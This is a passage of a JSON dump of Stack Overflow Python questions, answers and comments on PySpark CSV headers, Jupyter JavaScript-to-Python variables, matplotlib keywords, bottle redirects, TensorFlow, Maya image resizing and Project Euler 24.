from the header of a csv file in pyspark", "body": "<p>Easy enough to fix your specific problem:\njust use <code>flatMap</code> instead of <code>map</code></p>\n\n<pre><code>data = read_file.flatMap(lambda l: l.split(\",\"))\n</code></pre>\n\n<p>Obviously taking <code>[0]</code> of the result as in <code>data.collect()[0]</code> is also a solution.</p>\n\n<p>However the way you currently doing it you are iterating over the whole file to discard all lines but the first one. I would recommend using <code>.take(1)</code> on the rdd.</p>\n\n<pre><code>first_line = sc.textFile('test.csv').take(1)\nfirst_line[0].split(\",\")\n</code></pre>\n\n<p>This second solution is a lot faster on long files.</p>\n\n<p>Also note that your filter function does not currently serve any purpose, you could just leave out <code>.map(filter)</code>.</p>\n"}], "owner": {"reputation": 2163, "user_id": 2966197, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/171eadb3de26f91e2db374d3620be388?s=128&d=identicon&r=PG&f=1", "display_name": "user2966197", "link": "https://stackoverflow.com/users/2966197/user2966197"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 220, "favorite_count": 0, "accepted_answer_id": 37173655, "answer_count": 1, "score": -1, "last_activity_date": 1469406743, "creation_date": 1462999578, "question_id": 37172979, "link": "https://stackoverflow.com/questions/37172979/form-a-list-of-strings-from-the-header-of-a-csv-file-in-pyspark", "title": "form a list of strings from the header of a csv file in pyspark", "body": "<p>I am trying to form a list of strings from the header of a csv file in pyspark. The header in csv file is in unicode format. I wrote this code which reads the header but it doesn't form the list with individual values from the header:</p>\n\n<pre><code>def filter(line):\n\n    return line\n\nread_file = sc.textFile('file:///file1.csv').zipWithIndex().filter(lambda (line, rownum): rownum == 0).map(lambda (line, rownum): line)\n\n\ndata = (read_file\n        .map(lambda line: line.split(\",\"))\n        .filter(lambda line: len(line) &gt;= 1)\n        .map(filter))\n\nprint data.collect()\n</code></pre>\n\n<p>The output I see looks like this:</p>\n\n<pre><code>[[u'header1', u'header2', u'header3', u'header4', u'header5']]\n</code></pre>\n\n<p>while I want it to be <code>['header1','header2','header3','header4','header5']</code></p>\n\n<p>How can I correct it and form the list?</p>\n"}, {"tags": ["python", "ipython", "jupyter", "jupyter-notebook"], "comments": [{"owner": {"reputation": 35559, "user_id": 434217, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f1ae3f14fd5b87c2c3f7b36014e185c?s=128&d=identicon&r=PG", "display_name": "Thomas K", "link": "https://stackoverflow.com/users/434217/thomas-k"}, "edited": false, "score": 0, "creation_date": 1463045835, "post_id": 37172978, "comment_id": 61899074, "body": "The reason this doesn&#39;t work is that it will finish executing the code in the cell before it executes the new code that the Javascript has sent it."}], "answers": [{"comments": [{"owner": {"reputation": 1025, "user_id": 1698426, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/01fc68ff8e5babbe4e81075539a4b3ab?s=128&d=identicon&r=PG", "display_name": "John Schmitt", "link": "https://stackoverflow.com/users/1698426/john-schmitt"}, "edited": false, "score": 0, "creation_date": 1463004610, "post_id": 37173442, "comment_id": 61882874, "body": "Are there any practical differences between the two?"}, {"owner": {"reputation": 169, "user_id": 4572326, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b7a5fd36fabd85460917e4caa11b994b?s=128&d=identicon&r=PG", "display_name": "LFRC", "link": "https://stackoverflow.com/users/4572326/lfrc"}, "edited": false, "score": 0, "creation_date": 1475459184, "post_id": 37173442, "comment_id": 66937311, "body": "How is possible to call  external javascript scripts?"}, {"owner": {"reputation": 169, "user_id": 4572326, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b7a5fd36fabd85460917e4caa11b994b?s=128&d=identicon&r=PG", "display_name": "LFRC", "link": "https://stackoverflow.com/users/4572326/lfrc"}, "edited": false, "score": 3, "creation_date": 1475459341, "post_id": 37173442, "comment_id": 66937334, "body": "how to generate bi-directional communication between those two?"}, {"owner": {"reputation": 5300, "user_id": 1298461, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/76f8604ac955a6ed812cf3d9cf803b6c?s=128&d=identicon&r=PG", "display_name": "KIC", "link": "https://stackoverflow.com/users/1298461/kic"}, "edited": false, "score": 0, "creation_date": 1589891725, "post_id": 37173442, "comment_id": 109467525, "body": "this does not work for me once I &quot;restart and re-run all cells&quot; using the &gt;&gt; button. Seems to be a timing issue."}, {"owner": {"reputation": 6097, "user_id": 2876079, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/6NZXD.png?s=128&g=1", "display_name": "Stefan", "link": "https://stackoverflow.com/users/2876079/stefan"}, "edited": false, "score": 0, "creation_date": 1605797469, "post_id": 37173442, "comment_id": 114767020, "body": "Does not work in JupyterLab because JavaScript does not know IPython."}], "tags": [], "owner": {"reputation": 7130, "user_id": 1429073, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6cf3963f7758df3b57542c790e598630?s=128&d=identicon&r=PG&f=1", "display_name": "DevLounge", "link": "https://stackoverflow.com/users/1429073/devlounge"}, "is_accepted": true, "score": 13, "last_activity_date": 1463001909, "last_edit_date": 1463001909, "creation_date": 1463001416, "answer_id": 37173442, "question_id": 37172978, "link": "https://stackoverflow.com/questions/37172978/how-to-pass-variables-from-javascript-to-python-in-jupyter/37173442#37173442", "title": "How to pass variables from javascript to python in Jupyter?", "body": "<p>This is how I made your code work:\n<a href=\"https://i.stack.imgur.com/ggH35.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/ggH35.png\" alt=\"enter image description here\"></a></p>\n\n<p>or even simpler:</p>\n\n<p><a href=\"https://i.stack.imgur.com/vKatp.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/vKatp.png\" alt=\"enter image description here\"></a></p>\n"}, {"tags": [], "owner": {"reputation": 135, "user_id": 2353055, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a3d5579eecffae5b18a253052d80dc99?s=128&d=identicon&r=PG", "display_name": "SidML", "link": "https://stackoverflow.com/users/2353055/sidml"}, "is_accepted": false, "score": 3, "last_activity_date": 1513015322, "last_edit_date": 1513015322, "creation_date": 1512771168, "answer_id": 47722925, "question_id": 37172978, "link": "https://stackoverflow.com/questions/37172978/how-to-pass-variables-from-javascript-to-python-in-jupyter/47722925#47722925", "title": "How to pass variables from javascript to python in Jupyter?", "body": "<pre><code>from IPython.display import HTML\nHTML('''\n&lt;script type=\"text/javascript\"&gt;\n    IPython.notebook.kernel.execute(\"foo=11\")\n&lt;/script&gt;\n ''')\nfrom time import sleep\nsleep(3)\nprint(foo)\n</code></pre>\n\n<p>The reason this works is the HTML takes some time to work and you print it even before the value is set. With sleep, the wait time of 3s seems to be enough and the variable gets assigned.</p>\n"}, {"tags": [], "owner": {"reputation": 151, "user_id": 5114276, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-8XRGAfqLoY8/AAAAAAAAAAI/AAAAAAAAD3w/Ve7wBWqtb9g/photo.jpg?sz=128", "display_name": "guiferviz", "link": "https://stackoverflow.com/users/5114276/guiferviz"}, "is_accepted": false, "score": 2, "last_activity_date": 1549205627, "creation_date": 1549205627, "answer_id": 54504064, "question_id": 37172978, "link": "https://stackoverflow.com/questions/37172978/how-to-pass-variables-from-javascript-to-python-in-jupyter/54504064#54504064", "title": "How to pass variables from javascript to python in Jupyter?", "body": "<p>The problem here is that the HTML object is not the last one in the cell. So it is ignored in the same way any other value without print is not shown, unless it is the last one in the cell.\nIf you execute a cell with the next code, you won't see any alert window.</p>\n\n<pre><code>HTML('''\n    &lt;script type=\"text/javascript\"&gt;\n        alert(\"hello\")\n    &lt;/script&gt;\n''')\nprint(\"hello\")\n</code></pre>\n\n<p>Ensure that the last object in the cell is the HTML object and you will see the alert window.</p>\n\n<pre><code>HTML('''\n    &lt;script type=\"text/javascript\"&gt;\n        alert(\"hello\")\n    &lt;/script&gt;\n''')\n</code></pre>\n\n<p>That's why the examples of Anthony Perot work, they are separated cells.\nThis should also work:</p>\n\n<p><a href=\"https://i.stack.imgur.com/zxSIm.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/zxSIm.png\" alt=\"HTML and print in separated cells\"></a></p>\n"}, {"tags": [], "owner": {"reputation": 129, "user_id": 12998504, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-yl57SjKtaW0/AAAAAAAAAAI/AAAAAAAAAAA/AKF05nCzFyVXDwxDO3fP74G4lePU2-v41A/photo.jpg?sz=128", "display_name": "uhetz", "link": "https://stackoverflow.com/users/12998504/uhetz"}, "is_accepted": false, "score": 1, "last_activity_date": 1599640997, "creation_date": 1599640997, "answer_id": 63807954, "question_id": 37172978, "link": "https://stackoverflow.com/questions/37172978/how-to-pass-variables-from-javascript-to-python-in-jupyter/63807954#63807954", "title": "How to pass variables from javascript to python in Jupyter?", "body": "<p>If you have a function in your js code that takes some parameters and you would like to call that from Jupyter Notebook, you can do following:</p>\n<pre><code>from IPython.display import HTML, Javascript\n\nHTML('&lt;script src=&quot;./yourfile.js&quot;&gt;&lt;/script&gt;\nJavascript('yourFunction(%s)' % parameter)\n</code></pre>\n<p>In that case, that you are using pandas's dataframe, the last line should be looking following:</p>\n<pre><code>Javascript('yourFunction(%s)' % parameter.to_json(orient='records'))\n</code></pre>\n<p>Links:</p>\n<ul>\n<li><a href=\"https://ipython.readthedocs.io/en/stable/api/generated/IPython.display.html\" rel=\"nofollow noreferrer\">https://ipython.readthedocs.io/en/stable/api/generated/IPython.display.html</a></li>\n<li><a href=\"https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.html\" rel=\"nofollow noreferrer\">https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.html</a></li>\n<li><a href=\"https://pyformat.info/\" rel=\"nofollow noreferrer\">https://pyformat.info/</a></li>\n</ul>\n<p>Instead of '%' you can choose format function</p>\n"}], "owner": {"reputation": 1025, "user_id": 1698426, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/01fc68ff8e5babbe4e81075539a4b3ab?s=128&d=identicon&r=PG", "display_name": "John Schmitt", "link": "https://stackoverflow.com/users/1698426/john-schmitt"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5696, "favorite_count": 0, "accepted_answer_id": 37173442, "answer_count": 4, "score": 7, "last_activity_date": 1599640997, "creation_date": 1462999572, "last_edit_date": 1495542782, "question_id": 37172978, "link": "https://stackoverflow.com/questions/37172978/how-to-pass-variables-from-javascript-to-python-in-jupyter", "title": "How to pass variables from javascript to python in Jupyter?", "body": "<p>As I understand it, I should be able to print the variable <code>foo</code> in the snippet below. </p>\n\n<pre><code>from IPython.display import HTML\nHTML('''\n    &lt;script type=\"text/javascript\"&gt;\n        IPython.notebook.kernel.execute(\"foo=97\")\n    &lt;/script&gt;\n     ''')\nprint(foo)\n</code></pre>\n\n<p>Instead, I see this error message:</p>\n\n<pre><code>NameErrorTraceback (most recent call last)\n&lt;ipython-input-2-91b73ee49ec6&gt; in &lt;module&gt;()\n      5     &lt;/script&gt;\n      6      ''')\n----&gt; 7 print(foo)\n\nNameError: name 'foo' is not defined\n</code></pre>\n\n<p>I'm trying to use <a href=\"https://stackoverflow.com/a/37134476/1698426\">this answer</a> but struggling to make it work.</p>\n\n<p>FWIW, this is the latest Jupyter code (according to pip) running on Fedora 23. What are the prerequisites to make this work?</p>\n"}, {"tags": ["python", "matplotlib"], "comments": [{"owner": {"reputation": 3739, "user_id": 5422525, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/9fb3d7ac742a990084930a48b6001421?s=128&d=identicon&r=PG&f=1", "display_name": "M.T", "link": "https://stackoverflow.com/users/5422525/m-t"}, "edited": false, "score": 3, "creation_date": 1462999892, "post_id": 37172958, "comment_id": 61880705, "body": "I believe <code>scatter</code> uses <code>linewidth</code>/<code>lw</code>  for the edge colour. <i>Why</i> they did this is probably less easy to answer."}], "owner": {"reputation": 4424, "user_id": 5452008, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh3.googleusercontent.com/-305SHYPJuxE/AAAAAAAAAAI/AAAAAAAAABE/re8EZA9WuXs/photo.jpg?sz=128", "display_name": "S&#246;ren", "link": "https://stackoverflow.com/users/5452008/s%c3%b6ren"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 440, "favorite_count": 0, "answer_count": 0, "score": 4, "last_activity_date": 1462999902, "creation_date": 1462999522, "last_edit_date": 1462999902, "question_id": 37172958, "link": "https://stackoverflow.com/questions/37172958/why-does-matplotlib-pyplot-scatter-not-support-markeredgewidth-or-mew-keyw", "title": "Why does matplotlib.pyplot.scatter() not support &#39;markeredgewidth&#39; or &#39;mew&#39; keywords?", "body": "<p>It appears for each function you have to customize the plots a little different. Why is it implemented that way? Is it just by chance, or is it not possible to implement a uniform set of keywords that works for most functions?  </p>\n\n<p>e.g. pyplot.scatter() uses 'c' while plt.plot() uses 'color'. </p>\n\n<p>I am puzzled each time when I have to google how to do these things and I would like to understand the reasons, if there are some.</p>\n"}, {"tags": ["python", "bottle"], "answers": [{"tags": [], "owner": {"reputation": 14447, "user_id": 593047, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/ZTl2D.jpg?s=128&g=1", "display_name": "ron rothman", "link": "https://stackoverflow.com/users/593047/ron-rothman"}, "is_accepted": false, "score": 0, "last_activity_date": 1463103431, "creation_date": 1463103431, "answer_id": 37199926, "question_id": 37172937, "link": "https://stackoverflow.com/questions/37172937/redirecting-to-a-page-requiring-session-cookies-in-bottle/37199926#37199926", "title": "Redirecting to a page requiring session cookies in bottle", "body": "<p>The response from <code>post</code> is not a url, it's an object of type <code>requests.models.Response</code>.</p>\n\n<p><code>bottle.redirect</code> takes a url (string), not a <code>requests.models.Response</code> object.</p>\n\n<p>If your application is simple enough, perhaps you can just get away with hard coding your post-login page:</p>\n\n<pre><code>bottle.redirect('http://example.com/home')\n</code></pre>\n\n<p>Otherwise, you should consult the login service's API docs to see how to extract the url from their response. E.g., perhaps they return json, which you'll need to decode, that contains a \"url\" field.</p>\n\n<pre><code>resp = s.post(...)\nresp_dict = json.loads(resp.content)\nbottle.redirect(resp_dict['post_auth_url'])\n</code></pre>\n"}], "owner": {"reputation": 163, "user_id": 3482550, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/13de644a8a9c2a788c04baa0c69c08f0?s=128&d=identicon&r=PG&f=1", "display_name": "Cain", "link": "https://stackoverflow.com/users/3482550/cain"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 461, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1463103431, "creation_date": 1462999457, "last_edit_date": 1463003922, "question_id": 37172937, "link": "https://stackoverflow.com/questions/37172937/redirecting-to-a-page-requiring-session-cookies-in-bottle", "title": "Redirecting to a page requiring session cookies in bottle", "body": "<p>I am looking for advice on how to redirect to a page requiring session cookies in bottle. I want to allow users to, given the correct username and password for a given service, be automatically re-directed to this external service logged in. </p>\n\n<p>I have a function that is able to login server side, get a redirection URL and session cookies for auth.</p>\n\n<pre><code> with requests.session() as s:\n    r = s.post(\"https://someservice.com/Account/LogOn\",\n               data=payload)\n\n    redirect_object = {'url':r, 'session':s}\n    return redirect_object\n</code></pre>\n\n<p>When I try to redirect using</p>\n\n<pre><code>bottle.redirect(redirect_object['url'])\n</code></pre>\n\n<p>I clearly get sent to the login page instead of to the homepage as a logged in user as I do not have the session information in my browser. </p>\n\n<p>How do I pass this session information when being redirected to the homepage? Is this possible?</p>\n"}, {"tags": ["python", "tensorflow"], "comments": [{"owner": {"reputation": 40934, "user_id": 121687, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/359b919642638c5b67555a1bc89dfd3e?s=128&d=identicon&r=PG", "display_name": "fabrizioM", "link": "https://stackoverflow.com/users/121687/fabriziom"}, "edited": false, "score": 0, "creation_date": 1463001994, "post_id": 37172853, "comment_id": 61881779, "body": "there are many errors in your code. What is the overlying task that you are trying to model with tensorflow ?"}, {"owner": {"reputation": 619, "user_id": 6233298, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/05953685145edbcab419303fa2f2097c?s=128&d=identicon&r=PG&f=1", "display_name": "Sufeng Niu", "link": "https://stackoverflow.com/users/6233298/sufeng-niu"}, "reply_to_user": {"reputation": 40934, "user_id": 121687, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/359b919642638c5b67555a1bc89dfd3e?s=128&d=identicon&r=PG", "display_name": "fabrizioM", "link": "https://stackoverflow.com/users/121687/fabriziom"}, "edited": false, "score": 0, "creation_date": 1463010584, "post_id": 37172853, "comment_id": 61884728, "body": "@fabrizioM Thank you. this is just a simplified code to reproduce my error. one part of my code is given a story, and I split it into many sentences. Based on number of sentences, I built a feedforward neural network. In that sense, the neural network weights dimension is determined by number of sentences. That is what I am trying to do"}, {"owner": {"reputation": 40934, "user_id": 121687, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/359b919642638c5b67555a1bc89dfd3e?s=128&d=identicon&r=PG", "display_name": "fabrizioM", "link": "https://stackoverflow.com/users/121687/fabriziom"}, "edited": false, "score": 0, "creation_date": 1463011781, "post_id": 37172853, "comment_id": 61885028, "body": "so you need a maximum size of the size of the sentence.  <code>a = tf.placeholder(tf.int32, shape=[ SenteceMaxSize])</code>"}, {"owner": {"reputation": 619, "user_id": 6233298, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/05953685145edbcab419303fa2f2097c?s=128&d=identicon&r=PG&f=1", "display_name": "Sufeng Niu", "link": "https://stackoverflow.com/users/6233298/sufeng-niu"}, "reply_to_user": {"reputation": 40934, "user_id": 121687, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/359b919642638c5b67555a1bc89dfd3e?s=128&d=identicon&r=PG", "display_name": "fabrizioM", "link": "https://stackoverflow.com/users/121687/fabriziom"}, "edited": false, "score": 0, "creation_date": 1463012534, "post_id": 37172853, "comment_id": 61885217, "body": "@fabrizioM, Thank you. I tried that, still the same error, In the above example, I change <code>a = tf.placeholder(tf.int32, shape=[10])</code> the Error is still the same: TypeError: List of Tensors when single Tensor expected"}], "owner": {"reputation": 619, "user_id": 6233298, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/05953685145edbcab419303fa2f2097c?s=128&d=identicon&r=PG&f=1", "display_name": "Sufeng Niu", "link": "https://stackoverflow.com/users/6233298/sufeng-niu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 444, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1462999201, "creation_date": 1462999201, "question_id": 37172853, "link": "https://stackoverflow.com/questions/37172853/tensorflow-get-tensor-size-but-failed-to-initialize-tf-variable-size", "title": "tensorflow get tensor size but failed to initialize tf.Variable size", "body": "<p>I tried to use a placeholder to hold a list, and get the length of it. Then when I use it to initialize my variable, it give the error</p>\n\n<p>following is a sample code to create the error:</p>\n\n<pre><code>import tensorflow as tf\n\na = tf.placeholder(tf.int32, shape=[None])\nstory_mask=[4,7,10,12,15]\ninput_feed={}\ninput_feed[a.name] = story_mask\nb = tf.reshape(tf.shape(a), [])\nweights = tf.Variable(tf.truncated_normal([b, b], -0.1, 0.1), name=\"l1_weights\")\nc = tf.matmul(a, weights)\n\nsess = tf.Session()\nprint(sess.run(c,input_feed))\n</code></pre>\n\n<p>The Error message is at:</p>\n\n<pre><code>weights = tf.Variable(tf.truncated_normal([b, b], -0.1, 0.1), name=\"l1_weights\")\n</code></pre>\n\n<p>and message is:</p>\n\n<blockquote>\n  <p>TypeError: List of Tensors when single Tensor expected</p>\n</blockquote>\n\n<p>Anyone has idea where I am wrong. Thank you</p>\n"}, {"tags": ["python", "image", "resize", "python-imaging-library", "maya"], "comments": [{"owner": {"reputation": 1072, "user_id": 5551941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/476721724e17623864f5155dcbe138ed?s=128&d=identicon&r=PG&f=1", "display_name": "wyattis", "link": "https://stackoverflow.com/users/5551941/wyattis"}, "edited": false, "score": 0, "creation_date": 1463000757, "post_id": 37172852, "comment_id": 61881138, "body": "Double check your filename. I also noticed that you were missing the compression argument from <code>image.writeToFile(path, compression)</code>. Compression should match the extension (<code>&#39;png&#39;</code> in your case)."}, {"owner": {"reputation": 21, "user_id": 6322422, "user_type": "registered", "profile_image": "https://graph.facebook.com/10209320157420254/picture?type=large", "display_name": "David Alin", "link": "https://stackoverflow.com/users/6322422/david-alin"}, "reply_to_user": {"reputation": 1072, "user_id": 5551941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/476721724e17623864f5155dcbe138ed?s=128&d=identicon&r=PG&f=1", "display_name": "wyattis", "link": "https://stackoverflow.com/users/5551941/wyattis"}, "edited": false, "score": 0, "creation_date": 1463006900, "post_id": 37172852, "comment_id": 61883675, "body": "You are a life savior my friend. &#39;png&#39; was the thing missing. I always miss stupid details like these. Thank you so much"}], "answers": [{"comments": [{"owner": {"reputation": 161, "user_id": 953547, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf711e8ca26a51992858158553239837?s=128&d=identicon&r=PG", "display_name": "Pouf", "link": "https://stackoverflow.com/users/953547/pouf"}, "edited": false, "score": 0, "creation_date": 1544086483, "post_id": 37174559, "comment_id": 94153752, "body": "Good solution but please keep this in mind : &quot;Wildcard imports (from &lt;module&gt; import *) should be avoided, as they make it unclear which names are present in the namespace, confusing both readers and many automated tools.&quot;"}], "tags": [], "owner": {"reputation": 2302, "user_id": 2742418, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zbieZ.png?s=128&g=1", "display_name": "DrWeeny", "link": "https://stackoverflow.com/users/2742418/drweeny"}, "is_accepted": false, "score": 2, "last_activity_date": 1463007139, "creation_date": 1463007139, "answer_id": 37174559, "question_id": 37172852, "link": "https://stackoverflow.com/questions/37172852/re-size-images-in-maya-with-python/37174559#37174559", "title": "Re size images in Maya with Python", "body": "<p>You may use QImage.scaled() from PySide/PyQt\n<a href=\"http://pyqt.sourceforge.net/Docs/PyQt4/qimage.html#scaled\" rel=\"nofollow\">http://pyqt.sourceforge.net/Docs/PyQt4/qimage.html#scaled</a></p>\n\n<pre><code>from PySide.QtCore import *\nfrom PySide.QtGui import *\n\npicture = QImage(path)\npic_rescaled = picture.scaled(2048, 2048, Qt.KeepAspectRatio)\npic_rescaled.save(path, \"PNG\")\n</code></pre>\n\n<p>Should work on any Maya 2014+</p>\n"}, {"tags": [], "owner": {"reputation": 1072, "user_id": 5551941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/476721724e17623864f5155dcbe138ed?s=128&d=identicon&r=PG&f=1", "display_name": "wyattis", "link": "https://stackoverflow.com/users/5551941/wyattis"}, "is_accepted": false, "score": 1, "last_activity_date": 1463008186, "creation_date": 1463008186, "answer_id": 37174722, "question_id": 37172852, "link": "https://stackoverflow.com/questions/37172852/re-size-images-in-maya-with-python/37174722#37174722", "title": "Re size images in Maya with Python", "body": "<p>You're missing the compression argument within <code>image.writeToFile(path, compression)</code>. In this case it should be 'png', but in general this should match the extension of the file you loaded originally.</p>\n"}], "owner": {"reputation": 21, "user_id": 6322422, "user_type": "registered", "profile_image": "https://graph.facebook.com/10209320157420254/picture?type=large", "display_name": "David Alin", "link": "https://stackoverflow.com/users/6322422/david-alin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 903, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1463008186, "creation_date": 1462999191, "question_id": 37172852, "link": "https://stackoverflow.com/questions/37172852/re-size-images-in-maya-with-python", "title": "Re size images in Maya with Python", "body": "<p>I'm pretty nooby to coding in general so please be gentle, i'm trying my best here.\nI want a script that could batch process images inside Maya. The process should be simple: open an image from a given path folder, resize it, overwrite it.\nI know PIL should be able to do that, however it appears so it's not supported since Maya 2014 or something. I've tried the code in Maya 2012 and it works but since I want my code to be accessible to all, I want to find a workaround.\nI'm aware someone re-released a module so it can be supported on more recent builds (on windows only though).</p>\n\n<p><a href=\"http://mistermatti.wordpress.com/2014/02/04/maya-2014-with-pythons-pil-module/\" rel=\"nofollow\">http://mistermatti.wordpress.com/2014/02/04/maya-2014-with-pythons-pil-module/</a></p>\n\n<p>But even when I install it in my build, I get this error when attempting to open my file:</p>\n\n<pre><code>open(\"E:/SoNuchframe000-00000.png\")\n</code></pre>\n\n<blockquote>\n  <p>cannot identify image file</p>\n</blockquote>\n\n<p>I've tried copying the whole module into my own script and it does the same thing.</p>\n\n<p>On the side I've also tried the OpenMaya module</p>\n\n<pre><code>    image.readFromFile('E:/SoNuchframe000-00000.png')\n    image.resize(2048, 2048, False)\n    image.writeToFile('E:/SoNuchframe000-00000.png' + 'Resized.png')\n</code></pre>\n\n<p>and this gives me an empty image of 12mb (so by the way, if I could keep it compressed, that would be awesome)</p>\n\n<p>So now, I've reached the limit of my powers. I do not know what I could do from here. Any suggestion, or advice would be greatly welcomed. Thanks in advance</p>\n"}, {"tags": ["python", "algorithm", "permutation"], "comments": [{"owner": {"reputation": 44047, "user_id": 1400793, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7VxVK.png?s=128&g=1", "display_name": "Paul Hankin", "link": "https://stackoverflow.com/users/1400793/paul-hankin"}, "edited": false, "score": 1, "creation_date": 1463020793, "post_id": 37172808, "comment_id": 61887203, "body": "As you&#39;ve found here -- many Project Euler questions admit a brute force solution that&#39;s exponentially too slow. The challenge isn&#39;t to code the brute force solution in an efficient way (although occasionally that works), it&#39;s to find a mathematical or computer science technique to produce an efficient-enough solution. Asking other people for the best way to solve the puzzle is like asking someone else for the best move in a game of chess -- you might be moving the pieces, but you&#39;re not playing chess."}], "answers": [{"tags": [], "owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "is_accepted": false, "score": 2, "last_activity_date": 1462999274, "creation_date": 1462999274, "answer_id": 37172874, "question_id": 37172808, "link": "https://stackoverflow.com/questions/37172808/i-want-to-make-my-solution-for-project-euler-24-more-efficient/37172874#37172874", "title": "I want to make my solution for project Euler 24 more efficient", "body": "<p>For your current algorithm, not much can be done. The <code>itertools.permutations</code> function will do most of what you've done for you somewhat faster but that's no fun. The point of the question is that with clever maths you can figure out the answer without generating all the permutations. An example discussion of this can be found here: <a href=\"http://www.mathblog.dk/project-euler-24-millionth-lexicographic-permutation/\" rel=\"nofollow\">http://www.mathblog.dk/project-euler-24-millionth-lexicographic-permutation/</a></p>\n"}, {"comments": [{"owner": {"reputation": 189, "user_id": 8460211, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/9d67941e3618b444ccc5b380152041e4?s=128&d=identicon&r=PG&f=1", "display_name": "Johnny Apple", "link": "https://stackoverflow.com/users/8460211/johnny-apple"}, "edited": false, "score": 0, "creation_date": 1509662261, "post_id": 37175716, "comment_id": 81120952, "body": "Why does this work, and what if n is smaller than the length?"}, {"owner": {"reputation": 16008, "user_id": 5043793, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f1f00f1698fb26cd39dc876d0a3fa0c?s=128&d=identicon&r=PG&f=1", "display_name": "niemmi", "link": "https://stackoverflow.com/users/5043793/niemmi"}, "reply_to_user": {"reputation": 189, "user_id": 8460211, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/9d67941e3618b444ccc5b380152041e4?s=128&d=identicon&r=PG&f=1", "display_name": "Johnny Apple", "link": "https://stackoverflow.com/users/8460211/johnny-apple"}, "edited": false, "score": 0, "creation_date": 1509788081, "post_id": 37175716, "comment_id": 81168822, "body": "@JohnnyApple: If you change <code>n</code> to <code>0</code> and run the code you can see that the output is the same as <code>digits</code>. It works because for <code>n</code> items there are <code>(n - 1)!</code> permutations starting with each item."}], "tags": [], "owner": {"reputation": 16008, "user_id": 5043793, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f1f00f1698fb26cd39dc876d0a3fa0c?s=128&d=identicon&r=PG&f=1", "display_name": "niemmi", "link": "https://stackoverflow.com/users/5043793/niemmi"}, "is_accepted": false, "score": 2, "last_activity_date": 1463015872, "creation_date": 1463015872, "answer_id": 37175716, "question_id": 37172808, "link": "https://stackoverflow.com/questions/37172808/i-want-to-make-my-solution-for-project-euler-24-more-efficient/37175716#37175716", "title": "I want to make my solution for project Euler 24 more efficient", "body": "<p>Here's a simple code that provides answer in an instant:</p>\n\n<pre><code>from math import factorial\n\ndigits = range(10)\nres = []\nn = 999999 # PE uses 1-based indexing\n\nfor i in xrange(len(digits) - 1, -1, -1):\n    index, n = divmod(n, factorial(i))\n    res.append(digits.pop(index))\n\nprint ''.join(str(i) for i in res)\n</code></pre>\n\n<p>It's based on factorials and the principle is really simple. Let's say you have digits <code>1234</code> which results to <code>4!</code> permutations. <code>3!</code> first permutations start with <code>1</code> so you can get the index of first digit simply by dividing permutation number with <code>3!</code>. Then remove the digit from available digits and add it to the result. For the following digits use remainder of previous division as permutation number.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 14127511, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AOh14GiAFgii_O1KOhJTrCb6q53X6ZVj5HMWIIBLfg=k-s128", "display_name": 